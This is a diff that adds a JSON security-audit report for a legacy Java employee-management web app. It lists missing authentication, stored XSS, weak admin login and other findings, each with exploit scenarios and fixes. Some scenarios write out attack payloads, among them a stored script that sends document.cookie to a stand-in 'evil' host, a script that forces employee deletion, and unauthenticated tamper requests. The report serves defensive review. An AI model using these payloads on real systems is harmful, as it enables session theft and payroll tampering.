@@ -1,0 +1,443 @@
+{
+ "system": "employee-app",
+ "findings": [
+  {
+   "cwe": "CWE-306",
+   "severity": "Critical",
+   "source": "legacy/employee-app/servlet/DeleteEmployeeServlet.java:16",
+   "title": "Unauthenticated employee deletion: DeleteEmployeeServlet never checks the session",
+   "exploitScenario": "An anonymous attacker sends POST /DeleteEmployeeServlet with id=N&name=<name taken from the also-unauthenticated /ShowEmployeeServlet> and deletes every employee record without logging in.",
+   "recommendedFix": "Add a servlet Filter mapped to /* (except index.jsp, Login.jsp, signup.jsp, LoginServlet, styles.css) that does `HttpSession s = req.getSession(false); if (s == null || s.getAttribute(\"adminName\") == null) { resp.sendError(401); return; }`, or declare a <security-constraint> in WEB-INF/web.xml. Do not depend on per-servlet checks alone.",
+   "maskedEvidence": "@WebServlet(\"/DeleteEmployeeServlet\") ... doPost(...) { String id = request.getParameter(\"id\"); ... employeeDAO.deleteEmployee(Integer.parseInt(id), name);  // line 27, no session lookup anywhere"
+  },
+  {
+   "cwe": "CWE-79",
+   "severity": "High",
+   "source": "legacy/employee-app/webapp/showEmployee.jsp:33",
+   "title": "Stored HTML/JavaScript injection: employee name and department are written into the page without escaping",
+   "exploitScenario": "An attacker sends POST /AddEmployeeServlet with name=<script>fetch('/EmployeeManagmentApp/DeleteEmployeeServlet',{method:'POST',body:new URLSearchParams({id:1,name:'x'})})</script>. No login is needed because AddEmployeeServlet never checks the session. The script is saved by EmployeeDAO.addEmployee and then runs in the browser of every admin who opens ShowEmployeeServlet.",
+   "recommendedFix": "Replace the scriptlet output with JSTL escaping: <td><c:out value=\"${emp.name}\"/></td> and <td><c:out value=\"${emp.department}\"/></td>. JSTL 1.2 is already in WEB-INF/lib. Alternatively, wrap each value in an HTML-encoder such as OWASP Encoder Encode.forHtml(). Also limit name and department length and allowed characters in AddEmployeeServlet and EditEmployeeServlet.",
+   "maskedEvidence": "<td><%= emp.getName() %></td>  (line 33)\n<td><%= emp.getDepartment() %></td>  (line 34)"
+  },
+  {
+   "cwe": "CWE-79",
+   "severity": "High",
+   "source": "legacy/employee-app/servlet/EditEmployeeServlet.java:25",
+   "title": "Stored script injection through the department edit path (same output point as the showEmployee.jsp issue)",
+   "exploitScenario": "An attacker sends POST /EditEmployeeServlet with field=department&newValue=<img src=x onerror=...>&id=<any existing id>. The servlet has no session check and does not use the name it receives. EmployeeDAO.updateEmployee (dao/EmployeeDAO.java:46-47) saves the value as-is, and it runs in the browser when showEmployee.jsp:34 displays it.",
+   "recommendedFix": "Escape the value on output with <c:out> in showEmployee.jsp. Add input validation for department, using an allow-list pattern such as ^[\\p{L}0-9 &.-]{1,100}$, before calling updateEmployee.",
+   "maskedEvidence": "String newValue = request.getParameter(\"newValue\"); ... ps.setString(1, newValue);  // EmployeeDAO.java:47"
+  },
+  {
+   "cwe": "CWE-306",
+   "severity": "High",
+   "source": "legacy/employee-app/servlet/EditEmployeeServlet.java:16",
+   "title": "Unauthenticated salary/department modification via EditEmployeeServlet",
+   "exploitScenario": "An anonymous attacker sends POST /EditEmployeeServlet with id=101&name=x&field=salary&newValue=999999 and changes any employee's salary without a session.",
+   "recommendedFix": "Put this behind the same authentication Filter or security-constraint. Also check that the caller is authorized to change payroll data (see the role-separation finding).",
+   "maskedEvidence": "boolean updated = employeeDao.updateEmployee(Integer.parseInt(id), field, newValue);  // line 29, no session check",
+   "severityNote": "The finding is confirmed. In legacy/employee-app/servlet/EditEmployeeServlet.java:16-29, the servlet is mapped with @WebServlet(\"/EditEmployeeServlet\"). doPost reads id, name, field and newValue and calls EmployeeDAO.updateEmployee as long as none of them is null. It never checks for a session or for the \"adminName\" attribute that LoginServlet.java:29 sets.\n\nI found nothing upstream that blocks the request: there is no web.xml, no security-constraint or login-config, no servlet Filter anywhere in the tree, and webapp/META-INF/context.xml only defines the database pool. In dao/EmployeeDAO.java:39-59, updateEmployee runs a parameterized UPDATE on employee_data.salary or employee_data.department for any id (field must be \"salary\" or \"department\"). So this is not SQL injection, but anyone can still change the data.\n\nThe \"name\" parameter is required but never checked against the record, so any non-empty value works. That means the finder's request (POST /EditEmployeeServlet with id=101&name=x&field=salary&newValue=999999) changes employee 101's salary without logging in. The route is reachable and this is production code, not a test fixture.\n\nI lowered the severity from Critical to High. An attacker can tamper with salary and department for every record, but cannot read data, run code or take over the system (CVSS-ish AV:N/AC:L/PR:N/UI:N/C:N/I:H/A:N, about 7.5).\n\nFix: add an authentication Filter mapped to /* that allows only Login.jsp, signup.jsp, LoginServlet, SignUpServlet and static files, and rejects requests without a session holding \"adminName\". Also check request.getSession(false) inside the servlet as a second line of defence. Add CSRF tokens, because the action changes data."
+  },
+  {
+   "cwe": "CWE-306",
+   "severity": "High",
+   "source": "legacy/employee-app/servlet/AddEmployeeServlet.java:18",
+   "title": "Unauthenticated employee creation via AddEmployeeServlet",
+   "exploitScenario": "An anonymous attacker scripts POST /AddEmployeeServlet to insert fake employees (ghost payroll entries) or take employee IDs before legitimate records use them.",
+   "recommendedFix": "Put this behind the authentication Filter or web.xml security-constraint, and reject requests that have no valid admin session.",
+   "maskedEvidence": "@WebServlet(\"/AddEmployeeServlet\") ... employeeDao.addEmployee(employee);  // line 62, no session check",
+   "severityNote": "The finding is real. In legacy/employee-app/servlet/AddEmployeeServlet.java, line 18 maps the servlet to \"/AddEmployeeServlet\". doPost (lines 22-73) only checks that fields are present and that ID and salary are numbers. It then calls EmployeeDAO.addEmployee at line 62. It never checks for a session or an \"adminName\" attribute.\n\nI looked for anything else that could enforce login and found nothing:\n- No WEB-INF/web.xml, so there is no security-constraint.\n- No servlet Filter class anywhere in the project.\n- webapp/META-INF/context.xml has no Realm or auth setup.\n- The only session code sets attributes (LoginServlet.java:29, Login.jsp:85). Nothing reads the session to block access.\n\nSo anyone can send POST /AddEmployeeServlet with name, id, salary and department and insert a row. That allows ghost payroll records, or taking IDs before real employees get them (a duplicate ID fails with SQL state 23505).\n\nI rate it High rather than Critical. The impact is unauthenticated writes to the employee table (integrity). This endpoint does not leak data or give code execution, so roughly CVSS AV:N/AC:L/PR:N/UI:N/C:N/I:H/A:N, about 7.5. The same missing check probably affects the Edit, Delete and Show servlets. The SignUpServlet also appears to let anyone register as an admin, which means adding a login check here would not be enough on its own.\n\nFix: add a servlet Filter for every route except Login, Signup and static assets. It should reject requests unless request.getSession(false) exists and has \"adminName\" set. Also lock down or remove open admin sign-up, and add CSRF tokens to state-changing POSTs."
+  },
+  {
+   "cwe": "CWE-306",
+   "severity": "High",
+   "source": "legacy/employee-app/servlet/ShowEmployeeServlet.java:19",
+   "title": "Unauthenticated disclosure of all employee names, departments and salaries",
+   "exploitScenario": "An anonymous attacker sends GET /ShowEmployeeServlet and receives the full payroll table (PII and salaries). The ID+name pairs it returns are also exactly what the delete endpoint needs.",
+   "recommendedFix": "Require an authenticated admin session through a Filter or security-constraint before calling getAllEmployees(). Treat salary as sensitive data.",
+   "maskedEvidence": "protected void doGet(...) { List<Employee> employeeList = employeeDao.getAllEmployees(); ... forward(\"showEmployee.jsp\") }  // lines 23-29"
+  },
+  {
+   "cwe": "CWE-269",
+   "severity": "High",
+   "source": "legacy/employee-app/servlet/SignUpServlet.java:18",
+   "title": "Open self-registration creates fully privileged admin accounts",
+   "exploitScenario": "Any visitor POSTs /SignupServlet with id=9999&name=attacker, then logs in through Login.jsp and gets full admin rights over all employee records.",
+   "recommendedFix": "Remove public admin sign-up. Admin creation should be an action that requires an existing admin session with an explicit 'manage-admins' role, or an out-of-band provisioning step, and new accounts should need approval.",
+   "maskedEvidence": "@WebServlet(\"/SignupServlet\") ... AdminDAO.saveAdmin(admin);  // line 37, no auth, invite or approval check",
+   "severityNote": "The finding holds up. In legacy/employee-app/servlet/SignUpServlet.java:18-37, `@WebServlet(\"/SignupServlet\")` doPost takes `id` and `name` from the request and calls `AdminDAO.saveAdmin(admin)` without any check: no session, invite token, approval step or existing-admin requirement. There is no web.xml (WEB-INF holds only lib/), no servlet Filter and no security-constraint, so nothing upstream blocks the request. AdminDAO.saveAdmin (dao/AdminDAO.java:20-28) inserts straight into admin_data. LoginServlet (servlet/LoginServlet.java:22-30) then logs the user in if `SELECT 1 FROM admin_data WHERE id=? AND name=?` returns a row. There is no password and no role field, so every admin_data row has the same full admin privilege. The exploit works as described: POST /SignupServlet with id=9999&name=attacker, then log in with the same values and get an admin session.\n\nI'm lowering the severity from Critical to High. A grep for \"session\" across servlet/*.java finds only the setAttribute call in LoginServlet, so the employee CRUD servlets (Add, Edit, Delete, Show) never check authentication at all. The bigger flaw is that missing access control on those endpoints, which should be its own finding. Self-registration only gives an attacker an admin session they don't need for that access. It's still a real privilege-management flaw (CWE-269) and an authentication bypass, made worse because a guessable ID and name are the only credentials.\n\nFix: remove the public signup route or restrict it to authenticated existing admins (or a one-time invite token). Add a password hash column checked at login, and put an auth filter in front of every protected servlet."
+  },
+  {
+   "cwe": "CWE-287",
+   "severity": "High",
+   "source": "legacy/employee-app/dao/AdminDAO.java:31",
+   "title": "Admin authentication uses no secret: login is just a numeric ID plus a display name",
+   "exploitScenario": "An attacker guesses small sequential admin IDs (schema.sql makes id an IDENTITY column) with common names, or reads the name from the 'Welcome, <name>' banner or from social knowledge, and logs in as that admin. No password exists anywhere.",
+   "recommendedFix": "Add a password column that stores a salted adaptive hash (bcrypt, scrypt or Argon2). Authenticate on username plus password with a constant-time hash comparison. Never use the display name as a credential. Consider SSO or container-managed auth.",
+   "maskedEvidence": "String sql = \"SELECT 1 FROM admin_data WHERE id = ? AND name = ?\";  // line 32; schema.sql:5-8 admin_data has only (id, name)",
+   "severityNote": "The finding is real. AdminDAO.validateAdmin (legacy/employee-app/dao/AdminDAO.java:31-44) logs an admin in when a row matches `id = ? AND name = ?`, and nothing else is checked. The admin_data table (schema.sql:5-8) has only two columns, id and name, so no password or secret exists. LoginServlet.java:21-30 passes the request's id and name straight to this check, and on a match it puts adminName in the session and redirects to Welcome.jsp. The queries use bound parameters, so there is no injection, but that does not reduce the problem: knowing an ID and a name is enough to log in. Admin IDs are small integers chosen by users, and SignUpServlet returns a specific \"An admin with this ID already exists\" error, which lets an attacker find which IDs are taken. A display name is not secret, and Welcome.jsp:53 shows it on screen. Nothing upstream sanitizes input in a way that changes this, and this is production code, not a test fixture.\n\nI lowered the severity from Critical to High because the extra damage from this flaw alone is limited. SignupServlet (SignUpServlet.java:18-48) lets anyone create an admin account without logging in. The only session use I found in the servlet and webapp folders is LoginServlet and Login.jsp setting adminName and Welcome.jsp displaying it. None of the employee servlets I reviewed check for a session. An attacker therefore already gets admin-level access without guessing anyone's ID and name. Impersonating a particular admin adds little except reaching that account's identity. The broader authentication design is badly broken and deserves a related Critical finding of its own: open admin self-registration plus missing session checks on the employee add, edit and delete endpoints.\n\nFix: add a password_hash column, check passwords with bcrypt or Argon2, rate-limit login attempts, and return one generic error message. Restrict or remove open admin signup. Add a servlet Filter that requires an authenticated session on all /*Employee* routes."
+  },
+  {
+   "cwe": "CWE-307",
+   "severity": "High",
+   "source": "legacy/employee-app/webapp/Login.jsp:81",
+   "title": "No brute-force protection or lockout on either login path",
+   "exploitScenario": "An attacker scripts unlimited POSTs to /Login.jsp or /LoginServlet, iterating id=1..N against a list of common names, until one succeeds. Nothing throttles, locks out or alerts.",
+   "recommendedFix": "Add per-account and per-IP rate limiting with exponential backoff or lockout, log failed attempts, and remove the duplicate login path so only one hardened endpoint exists.",
+   "maskedEvidence": "if (new AdminDAO().validateAdmin(Integer.parseInt(id.trim()), name)) { session.setAttribute(\"adminName\", name); ...  // lines 84-86; same pattern at servlet/LoginServlet.java:26-29"
+  },
+  {
+   "title": "Unauthenticated bulk exposure of employee salary data (PII)",
+   "cwe": "CWE-359",
+   "severity": "High",
+   "source": "legacy/employee-app/servlet/ShowEmployeeServlet.java:25",
+   "exploitScenario": "An anonymous attacker sends GET /EmployeeManagmentApp/ShowEmployeeServlet with no session and gets every employee's ID, name, department and salary, because the servlet (lines 23-29) and showEmployee.jsp:27-35 never check for sessionScope.adminName.",
+   "recommendedFix": "Add a servlet Filter mapped to /* (except index.jsp, Login.jsp, signup.jsp, LoginServlet, SignupServlet, styles.css). It should return 401 or redirect to Login.jsp when request.getSession(false) is null or has no adminName. Also check the session inside ShowEmployeeServlet.doGet as defence in depth.",
+   "maskedEvidence": "List<Employee> employeeList = employeeDao.getAllEmployees(); request.setAttribute(\"employeeList\", employeeList); // no session/auth check",
+   "isCredential": false
+  },
+  {
+   "title": "Admin 'credential' is a guessable, plaintext name used as the password",
+   "cwe": "CWE-256",
+   "severity": "High",
+   "source": "legacy/employee-app/dao/AdminDAO.java:32",
+   "exploitScenario": "Login needs only a small integer ID plus the admin's display name, which is stored in plaintext (schema.sql:7) and shown on Welcome.jsp:53. An attacker who knows or guesses a name (for example from an org chart) can brute-force IDs 1..N with no lockout and take over the admin session.",
+   "recommendedFix": "Add a password_hash column to admin_data and store a bcrypt/PBKDF2/Argon2 hash with a per-user salt. On signup, collect a password and hash it. On login, look up by ID and compare in constant time with BCrypt.checkpw. Add rate limiting or account lockout. Stop using the display name as a secret.",
+   "maskedEvidence": "String sql = \"SELECT 1 FROM admin_data WHERE id = ? AND name = ?\"; (schema.sql:5-8 admin_data has only id, name - no password/hash column)",
+   "isCredential": false
+  },
+  {
+   "cwe": "CWE-384",
+   "severity": "Medium",
+   "source": "legacy/employee-app/servlet/LoginServlet.java:29",
+   "title": "Session fixation: session ID is not rotated on successful login",
+   "exploitScenario": "An attacker plants a known JSESSIONID in the victim's browser. After the victim logs in, the attacker reuses that same session ID and is authenticated as the victim admin.",
+   "recommendedFix": "On successful authentication, call request.changeSessionId() (Servlet 3.1+), or invalidate the old session and create a new one, before setting adminName. Do this in both LoginServlet.java:29 and Login.jsp:85.",
+   "maskedEvidence": "request.getSession().setAttribute(\"adminName\", name);  // no changeSessionId()/invalidate(); also webapp/Login.jsp:85 session.setAttribute(\"adminName\", name);"
+  },
+  {
+   "cwe": "CWE-284",
+   "severity": "Medium",
+   "source": "legacy/employee-app/webapp/Welcome.jsp:1",
+   "title": "No container-level access control: there is no web.xml, security-constraint or auth Filter, so all JSPs are publicly reachable",
+   "exploitScenario": "An unauthenticated user browses directly to /Welcome.jsp, /addEmployee.jsp, /editEmployee.jsp or /deleteEmployee.jsp and gets the admin dashboard and forms. The 'protected' area is only enforced by navigation flow.",
+   "recommendedFix": "Create WEB-INF/web.xml with a <security-constraint> or an AuthFilter covering every page except the public ones. Have Welcome.jsp and the other admin pages redirect to Login.jsp when sessionScope.adminName is absent.",
+   "maskedEvidence": "<%@ page session=\"true\" %> ... Welcome, <c:out value=\"${sessionScope.adminName}\"/>  // no null check; webapp/WEB-INF contains only lib/jstl-1.2.jar, no web.xml"
+  },
+  {
+   "cwe": "CWE-352",
+   "severity": "Medium",
+   "source": "legacy/employee-app/servlet/EditEmployeeServlet.java:20",
+   "title": "No CSRF protection on state-changing admin endpoints or login",
+   "exploitScenario": "Once authentication is added, a malicious page visited by a logged-in admin auto-submits a form to /EditEmployeeServlet or /DeleteEmployeeServlet and modifies payroll with the admin's session cookie. Login CSRF against /Login.jsp is also possible.",
+   "recommendedFix": "Add a per-session synchronizer CSRF token to every POST form, validate it server-side in a Filter, and set the session cookie to SameSite=Strict/Lax.",
+   "maskedEvidence": "protected void doPost(HttpServletRequest request, HttpServletResponse response)  // Add/Edit/Delete/Signup servlets and Login.jsp accept POST without any token"
+  },
+  {
+   "cwe": "CWE-521",
+   "severity": "Medium",
+   "source": "legacy/employee-app/webapp/META-INF/context.xml:12",
+   "title": "Database pool configured with an empty password for role employee_app",
+   "exploitScenario": "If PostgreSQL trusts local or loopback logins (README step 2 creates the role with LOGIN and no password), any local process or SSRF-adjacent attacker connects as employee_app, which also owns the database, and reads or alters admin_data and employee_data directly, bypassing the app.",
+   "recommendedFix": "Give employee_app a strong password injected from the environment or a secrets manager (not committed). Require scram-sha-256 in pg_hba.conf. Make the app role a non-owner with least-privilege DML grants.",
+   "isCredential": true,
+   "credentialMeta": {
+    "credentialType": "PostgreSQL DB password (empty)",
+    "grantsAccessTo": "PostgreSQL database 'employee' on localhost:5432 as role employee_app (database owner per README)",
+    "maskedPreview": "password=\"\" (empty, no secret value present)",
+    "prodOrTest": "Appears to be dev/local config, but it is the only deployment config shipped",
+    "rotationRecommendation": "Set a strong password and enforce password auth; no existing secret value needs rotating"
+   },
+   "maskedEvidence": "username=\"employee_app\" password=\"\""
+  },
+  {
+   "title": "Login credentials and session cookie sent over cleartext HTTP (no transport guarantee, no Secure cookie)",
+   "cwe": "CWE-319",
+   "severity": "Medium",
+   "source": "legacy/employee-app/webapp/Login.jsp:66",
+   "exploitScenario": "A network attacker on the same LAN or Wi-Fi sniffs the plaintext POST of id/name to Login.jsp or LoginServlet, or the JSESSIONID cookie, and replays it to get admin access and all salary data. There is no web.xml (build.xml:43 needxmlfile=false), so no CONFIDENTIAL transport-guarantee or secure cookie-config applies, and README.md:97 tells users to browse over http://.",
+   "recommendedFix": "Add WEB-INF/web.xml with a <security-constraint> whose <user-data-constraint><transport-guarantee>CONFIDENTIAL</transport-guarantee> covers /*. Set <session-config><cookie-config><secure>true</secure><http-only>true</http-only></cookie-config></session-config>. Configure a TLS connector on Tomcat and send an HSTS header.",
+   "maskedEvidence": "<form method=\"post\" action=\"Login.jsp\"> ... <input type=\"text\" name=\"name\" required>",
+   "isCredential": false
+  },
+  {
+   "cwe": "CWE-20",
+   "severity": "Medium",
+   "source": "servlet/EditEmployeeServlet.java:29",
+   "title": "Edit salary path accepts NaN, Infinity and negative values (validation from Add is not applied on update)",
+   "exploitScenario": "An attacker POSTs field=salary&newValue=-99999 (or NaN / Infinity) to /EditEmployeeServlet; dao/EmployeeDAO.java:44 runs Double.parseDouble with no range check and writes it to employee_data.salary, which corrupts payroll data and slips past the 'salary cannot be negative' rule enforced only in AddEmployeeServlet.",
+   "recommendedFix": "Put salary validation in one shared validator and call it from both Add and Edit. Parse with new BigDecimal(newValue.trim()), reject non-finite values and anything outside 0 to a configured max, cap the scale at 2, then bind with ps.setBigDecimal. Add CHECK (salary >= 0 AND salary <> 'NaN'::float8 AND salary < 'Infinity'::float8) to schema.sql, or better, move the column to NUMERIC(12,2).",
+   "maskedEvidence": "dao/EmployeeDAO.java:44  ps.setDouble(1, Double.parseDouble(newValue));"
+  },
+  {
+   "cwe": "CWE-79",
+   "severity": "Medium",
+   "source": "webapp/showEmployee.jsp:33",
+   "title": "Unvalidated name and department are rendered unencoded (stored XSS caused by the missing validation)",
+   "exploitScenario": "An attacker stores name=<script>fetch('//evil/'+document.cookie)</script> through /AddEmployeeServlet, or department through /EditEmployeeServlet (neither servlet checks authentication). The script then runs in every admin's browser when they view /ShowEmployeeServlet, because lines 33-34 use raw <%= %> output.",
+   "recommendedFix": "Replace <%= emp.getName() %> and <%= emp.getDepartment() %> with <c:out value=\"${emp.name}\"/> (JSTL is already used in Welcome.jsp), and keep the server-side input allow-listing described above as defense in depth.",
+   "maskedEvidence": "<td><%= emp.getName() %></td> <td><%= emp.getDepartment() %></td>"
+  },
+  {
+   "cwe": "CWE-20",
+   "severity": "Low",
+   "source": "legacy/employee-app/dao/EmployeeDAO.java:44",
+   "title": "Salary update path accepts NaN, Infinity and negative values (no validation before the parameterized sink)",
+   "exploitScenario": "An attacker sends POST /EditEmployeeServlet with field=salary&newValue=NaN (or -1e308 or Infinity). Double.parseDouble accepts these, so PostgreSQL saves NaN or a negative or infinite salary. This skips the non-negative check that AddEmployeeServlet.java:49 applies and corrupts payroll data that other systems may read.",
+   "recommendedFix": "In updateEmployee, or better in EditEmployeeServlet, parse the value with new BigDecimal(newValue.trim()) and reject non-finite, negative or out-of-range values. Add a CHECK (salary >= 0) constraint to employee_data in schema.sql.",
+   "maskedEvidence": "ps.setDouble(1, Double.parseDouble(newValue));"
+  },
+  {
+   "cwe": "CWE-613",
+   "severity": "Low",
+   "source": "legacy/employee-app/webapp/Welcome.jsp:62",
+   "title": "Logout does not invalidate the session",
+   "exploitScenario": "After an admin clicks Logout on a shared machine, the next user (or anyone holding the stolen cookie) still has a live authenticated session, because the button only POSTs to index.jsp and adminName stays set.",
+   "recommendedFix": "Add a LogoutServlet (POST, CSRF-protected) that calls request.getSession(false).invalidate(), clears the JSESSIONID cookie, and redirects to Login.jsp. Point the logout form at it.",
+   "maskedEvidence": "<form action=\"index.jsp\" method=\"post\"> <button ...>Logout</button> </form>  // grep finds no session.invalidate() anywhere in the codebase",
+   "severityNote": "The finding is real, but its impact is overstated. I'd rate it Low, not Medium.\n\nWhat I confirmed in the code:\n- In legacy/employee-app/webapp/Welcome.jsp, the Logout button at lines 62-64 is just a form that POSTs to index.jsp.\n- index.jsp is a static home page with no session logic.\n- A search of the whole legacy/employee-app tree finds no `session.invalidate()` and no `removeAttribute` call.\n- `adminName` is set at LoginServlet.java:29 and Login.jsp:85 and is never cleared. So logging out leaves the session and its JSESSIONID cookie fully live until the container's timeout ends it. This is a real CWE-613 (insufficient session expiration).\n\nWhy the severity is too high:\n- The finder says the next user \"still has a live authenticated session\". The same search shows nothing in the app ever reads `adminName` (or any session attribute) to decide who gets access. Its only use is display, through `${sessionScope.adminName}` at Welcome.jsp:53.\n- No servlet or JSP checks for a login. AddEmployeeServlet, DeleteEmployeeServlet, EditEmployeeServlet, ShowEmployeeServlet, and the matching JSPs all run for anonymous users.\n- So a session that survives logout, or a stolen cookie, gives an attacker nothing they can't already get without logging in. The only extra exposure is the admin's display name and any leftover `message` attribute.\n- The real high-severity problem is the missing authentication and authorization on every route (CWE-306/862). That should be reported as a separate finding.\n\nWhen this becomes important: once access checks are added, this flaw turns into a genuine way to hijack a session. The fix belongs in the same change. Add a LogoutServlet that calls `request.getSession(false)` and, if a session exists, calls `invalidate()`. Point the Logout form at that servlet, and add CSRF protection to it. Also call `changeSessionId()` at login to prevent session fixation.\n\nNo credential values were involved in this review."
+  },
+  {
+   "cwe": "CWE-614",
+   "severity": "Low",
+   "source": "legacy/employee-app/webapp/META-INF/context.xml:2",
+   "title": "No session cookie hardening, idle timeout or transport guarantee is configured",
+   "exploitScenario": "With no web.xml <session-config>, <cookie-config><secure>, or CONFIDENTIAL transport guarantee, a network attacker on plain HTTP sniffs JSESSIONID and the ID/name login values, then hijacks the admin session.",
+   "recommendedFix": "In web.xml, set <session-config><session-timeout>15</session-timeout><cookie-config><http-only>true</http-only><secure>true</secure></cookie-config><tracking-mode>COOKIE</tracking-mode></session-config> and a <user-data-constraint> with CONFIDENTIAL. In context.xml, set useHttpOnly=\"true\" and a SameSite cookie processor.",
+   "maskedEvidence": "<Context path=\"/EmployeeManagmentApp\">  // no cookie/session attributes; no web.xml in webapp/WEB-INF"
+  },
+  {
+   "cwe": "CWE-598",
+   "severity": "Low",
+   "source": "legacy/employee-app/webapp/Login.jsp:78",
+   "title": "Login scriptlet accepts credentials over GET query string",
+   "exploitScenario": "GET /Login.jsp?id=1&name=Alice authenticates successfully, so login values end up in access logs, proxy logs and browser history, and a crafted link can perform login CSRF.",
+   "recommendedFix": "Remove the scriptlet authentication from Login.jsp and authenticate only in a POST-only servlet that rejects GET (point the form at LoginServlet and retire the duplicate path).",
+   "maskedEvidence": "String id = request.getParameter(\"id\"); String name = request.getParameter(\"name\"); if (id != null && name != null) { ... validateAdmin(...)"
+  },
+  {
+   "cwe": "CWE-269",
+   "severity": "Low",
+   "source": "legacy/employee-app/model/Admin.java:3",
+   "title": "No privilege separation: every admin account has full CRUD over all employee and payroll data",
+   "exploitScenario": "Any account, including one self-registered through the open sign-up, can change salaries and delete records, because there is no role or permission model to restrict sensitive operations.",
+   "recommendedFix": "Add a role column and an authorization check per action (for example only PAYROLL_ADMIN may edit salary). Enforce it server-side in each servlet or a central authorization Filter.",
+   "maskedEvidence": "public class Admin { private int id; private String name; ... }  // no role/permission field; schema.sql admin_data(id, name)",
+   "severityNote": "The code confirms the finding. legacy/employee-app/model/Admin.java has only `id` and `name`, and schema.sql defines admin_data(id, name), so there is no role or permission field anywhere. legacy/employee-app/servlet/SignUpServlet.java is unauthenticated and calls AdminDAO.saveAdmin with whatever id and name the caller supplies. LoginServlet then puts that account into the session, and every admin has the same power, including access to the Edit and Delete servlets. So a self-registered account really can change salaries and delete records.\n\nI'm lowering the severity to Low because the missing role model is not what makes this exploitable. The real causes are the open sign-up and the lack of any authorization check. DeleteEmployeeServlet.doPost does not even look at the session, so an attacker needs no account at all. Adding roles alone would close nothing while those gaps remain, and they should be reported as their own higher-severity findings (missing authentication or authorization, open admin self-registration, and a login that uses only id plus name with no password). Keep this one as a defense-in-depth design finding: add a role column, deny sensitive actions such as salary edits and deletes unless the role allows them, and check the role in every servlet."
+  },
+  {
+   "cwe": "CWE-840",
+   "severity": "Low",
+   "source": "legacy/employee-app/servlet/EditEmployeeServlet.java:29",
+   "title": "Edit requires an employee name but never verifies it (inconsistent with delete)",
+   "exploitScenario": "The UI implies an ID+name match is required to edit, but an attacker can change any employee by ID alone with an arbitrary name value, because updateEmployee ignores the name.",
+   "recommendedFix": "Either drop the misleading name requirement or pass the name to updateEmployee and add 'AND name = ?' to the WHERE clause. Do not treat this as an authorization control; real authorization must come from the session and role.",
+   "maskedEvidence": "String name = request.getParameter(\"name\"); ... employeeDao.updateEmployee(Integer.parseInt(id), field, newValue);  // name unused"
+  },
+  {
+   "title": "DB connection credentials hardcoded in a tracked, WAR-packaged context.xml; empty password implies a passwordless/trust-auth DB role",
+   "cwe": "CWE-798",
+   "severity": "Low",
+   "source": "legacy/employee-app/webapp/META-INF/context.xml:11",
+   "exploitScenario": "The DB login (employee_app) sits in source control with an empty password. README.md:77 creates the role with no password, so the database relies on pg_hba trust. Anyone who can reach PostgreSQL from a trusted host can log in as the app role and read or modify all employee and admin data. Also, README.md:82 tells operators to type the real password into this tracked file, which gets committed and packaged into the WAR (build.xml:44).",
+   "recommendedFix": "Take username and password out of webapp/META-INF/context.xml. Define the Resource in Tomcat's conf/context.xml or conf/Catalina/localhost/<app>.xml, outside the repo, and read the values from environment or system properties (${db.password} with org.apache.tomcat.util.digester.EnvironmentPropertySource). Create the role WITH PASSWORD and use scram-sha-256 in pg_hba.conf. Add a gitignore or pre-commit secret scan for context.xml overrides.",
+   "maskedEvidence": "username=\"em****\" password=\"\" (empty)",
+   "isCredential": true,
+   "credentialMeta": {
+    "credentialType": "PostgreSQL JDBC username with empty password",
+    "grantsAccessTo": "PostgreSQL database 'employee' on localhost:5432 (admin_data, employee_data tables) as owner role employee_app",
+    "maskedPreview": "username=em**** / password=<empty>",
+    "prodOrTest": "Appears to be a local/dev configuration (localhost); no live secret value present",
+    "rotationRecommendation": "No secret value to rotate. Set a strong password on the employee_app role, turn off trust auth, and keep the password out of source control from now on. Git history (Hibernate cfg in commit fd8d014 and earlier) has only empty or placeholder passwords, so nothing in history needs rotation."
+   },
+   "severityNote": "I confirmed the cited lines, but the finding is overstated. At legacy/employee-app/webapp/META-INF/context.xml:11-12 the username is \"em****\" and password=\"\" is empty. The URL on line 10 is jdbc:postgresql://localhost:5432/employee.\n\nWhat does not hold up:\n- No secret value is hardcoded or leaked. A role name is not a credential, and an empty password string reveals nothing. So \"CWE-798 Use of Hard-coded Credentials\" in the sense of an exposed secret that needs rotation does not apply.\n- Shipping context.xml inside the WAR is normal Tomcat practice. build.xml:44 packages webapp/**, so the claim about packaging is accurate, but nothing secret is in it today.\n\nWhat is real, as a configuration and design weakness:\n- README.md tells operators to create the role with CREATE ROLE employee_app LOGIN and no password. It then connects over TCP with an empty password. That only works if pg_hba.conf trusts localhost connections. So the documented deployment depends on a database role that has full ownership of the employee database (OWNER employee_app) and no password. Any local user or process on the DB host, or anything that can reach the trusted address, can connect as the app role and read or modify all employee and admin data.\n- The README also tells operators to type the real password into this tracked file. That invites committing a live password later. It is a latent risk, not a present leak.\n\nWhy Low: the exposure is limited to local or trusted hosts, which by definition already sit inside the trust boundary. It depends on the operator's pg_hba setup, and there is no remotely exploitable path in the code. The more accurate CWEs are CWE-521/CWE-1188 (passwordless role, insecure default) plus CWE-260 (password kept in a tracked config file).\n\nFix:\n- Give the role a strong password: CREATE ROLE ... LOGIN PASSWORD.\n- Require scram-sha-256 in pg_hba.conf.\n- Keep the real credentials out of the tracked file. Supply the Resource from Tomcat's conf/Catalina/localhost/<app>.xml, or resolve it from environment or system properties (${db.password}).\n- Add a gitignored context.xml template."
+  },
+  {
+   "title": "Admin account enumeration through distinct signup error message",
+   "cwe": "CWE-204",
+   "severity": "Low",
+   "source": "legacy/employee-app/servlet/SignUpServlet.java:44",
+   "exploitScenario": "An unauthenticated attacker posts to /SignupServlet with IDs 1..N. The distinct message 'An admin with this ID already exists' shows which admin IDs exist, which narrows the login brute force to a name guess. As a side effect the attacker also creates admin accounts for every free ID, which by itself grants full access.",
+   "recommendedFix": "Require an existing admin (or an invite token) for signup. Return a generic message. Have the database generate admin IDs (the IDENTITY column already exists) instead of accepting client-supplied IDs.",
+   "maskedEvidence": "\"23505\".equals(e.getSQLState()) ? \"An admin with this ID already exists. Please choose another ID.\" : ...",
+   "isCredential": false
+  },
+  {
+   "title": "JSTL 1.2 (2006 javax.servlet:jstl, embeds Apache Standard Taglib < 1.2.3) shipped in WAR is affected by CVE-2015-0254 (XXE / RCE via x:parse, x:transform, c:import)",
+   "cwe": "CWE-1395",
+   "severity": "Low",
+   "source": "legacy/employee-app/webapp/WEB-INF/lib/jstl-1.2.jar (packaged by legacy/employee-app/build.xml:45; used at legacy/employee-app/webapp/Welcome.jsp:2)",
